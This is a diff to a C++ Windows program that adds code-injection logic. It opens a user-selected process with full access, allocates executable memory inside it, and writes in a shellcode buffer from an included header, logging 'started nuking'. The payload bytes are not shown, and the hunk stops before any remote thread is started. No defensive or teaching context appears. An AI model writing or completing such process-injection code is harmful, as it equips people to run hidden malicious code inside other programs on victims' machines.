@@ -7,6 +7,8 @@
 #include <vector>
 #include <string>
 
+#include "shellcode.h"
+
 void PrintProcessNameAndID(DWORD processID);
 BOOL CALLBACK EnumWindowCallback(HWND hwnd, LPARAM lParam);
 
@@ -42,16 +44,35 @@ int main()
     std::cout << "Target: ";
     std::cin >> selection;
     
-    HANDLE processHandle = 0;
-    if (selection < pids.size())
-    {
-        //processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pids.at(selection));
-        std::cout << "<targetting : " << pids.at(selection) << ">\n";
-    }
-    else
+    HANDLE processHandle = NULL;
+    if (!(selection < pids.size()))
     {
         std::cout << "<unknown target>\n";
+        return 2;
     }
+
+    std::cout << "<targetting : " << pids.at(selection) << ">\n";
+    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pids.at(selection));
+
+    if (processHandle == NULL)
+    {
+        std::cout << "Error opening process handle\n";
+        return 3;
+    }
+    
+    void* allocatedMem = VirtualAllocEx(processHandle, NULL, sizeof(shellcode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+    
+    if (allocatedMem == nullptr)
+    {
+        std::cout << "Error allocating memory in target process\n";
+        return 4;
+    }
+
+    std::cout << "started nuking at <" << allocatedMem << ">\n";
+
+    WriteProcessMemory(processHandle, allocatedMem, shellcode, sizeof(shellcode), NULL);
+
+    CloseHandle(processHandle);
 
     return 0;
 }
